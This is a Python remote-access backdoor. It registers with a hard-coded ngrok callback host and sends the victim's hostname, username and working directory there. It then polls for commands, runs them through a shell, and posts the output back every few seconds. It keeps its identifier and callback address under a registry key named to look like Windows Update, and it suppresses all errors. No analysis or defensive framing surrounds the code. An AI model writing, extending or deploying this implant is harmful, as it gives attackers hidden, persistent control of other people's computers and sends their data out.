
import os, sys, base64, time, subprocess, socket, getpass
from urllib.request import urlopen, Request
from urllib.error import URLError

CALLBACK_URL = "https://e31e-2409-40e4-2043-2091-10a7-a6b-2c95-e16c.ngrok-free.app"
_PATH_SEP    = "---PATH_SEP---"

try:
    import winreg as _wr
    def _reg_get(name):
        try:
            k = _wr.OpenKey(_wr.HKEY_CURRENT_USER, r"SOFTWARE\WindowsUpdate")
            v, _ = _wr.QueryValueEx(k, name); _wr.CloseKey(k); return v
        except: return None
    def _reg_set(name, val):
        try:
            k = _wr.CreateKey(_wr.HKEY_CURRENT_USER, r"SOFTWARE\WindowsUpdate")
            _wr.SetValueEx(k, name, 0, _wr.REG_SZ, val); _wr.CloseKey(k)
        except: pass
except ImportError:
    def _reg_get(name): return None
    def _reg_set(name, val): pass

def _get_uid():
    uid = _reg_get("uid")
    if not uid:
        import uuid; uid = str(uuid.uuid4()); _reg_set("uid", uid)
    return uid

def _exec(cmd, cwd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=120, cwd=cwd)
        out = r.stdout + r.stderr
        return out if out.strip() else "(no output)"
    except Exception as e: return f"ERROR: {e}"

def _post(url, data, hdrs=None):
    hdrs = hdrs or {}
    req = Request(url,
                  data=data if isinstance(data, bytes) else data.encode(),
                  headers=hdrs, method="POST")
    with urlopen(req, timeout=10) as r:
        return r.read().decode(), dict(r.headers)

def _get(url, hdrs=None):
    hdrs = hdrs or {}
    req = Request(url, headers=hdrs)
    with urlopen(req, timeout=10) as r:
        return r.read().decode(), dict(r.headers)

def main():
    uid      = _get_uid()
    _reg_set("cb", CALLBACK_URL)
    hostname = socket.gethostname()
    username = getpass.getuser()
    cwd      = os.getcwd()
    info     = f"{uid}|{hostname}|{username}|{cwd}"
    sid      = ""
    while True:
        try:
            cb = _reg_get("cb") or CALLBACK_URL
            if not sid:
                b64i = base64.b64encode(info.encode()).decode()
                _, hdrs_r = _post(
                    f"{cb}/checkin", b64i,
                    {"Content-Type": "text/plain",
                     "ngrok-skip-browser-warning": "true"})
                sid = hdrs_r.get("X-Session-ID",
                                 hdrs_r.get("x-session-id", ""))
            if sid:
                task, _ = _get(
                    f"{cb}/get_task",
                    {"X-Session-ID": sid, "X-Agent-CWD": cwd,
                     "ngrok-skip-browser-warning": "true"})
                task = task.strip()
                if task:
                    if task.lower().startswith("cd"):
                        tgt = task[2:].strip() or os.path.expanduser("~")
                        if not os.path.isabs(tgt): tgt = os.path.join(cwd, tgt)
                        tgt = tgt.replace("/", os.sep)
                        try:
                            os.chdir(tgt); cwd = os.getcwd()
                            out = f"[+] {cwd}"
                        except Exception as e: out = f"[-] cd failed: {e}"
                    else:
                        out = _exec(task, cwd)
                        try: cwd = os.getcwd()
                        except: pass
                    payload = base64.b64encode(
                        (out + _PATH_SEP + cwd).encode()).decode()
                    _post(f"{cb}/submit_result", payload,
                          {"X-Session-ID": sid,
                           "Content-Type": "text/plain",
                           "ngrok-skip-browser-warning": "true"})
        except: pass
        time.sleep(3)

if __name__ == "__main__":
    main()
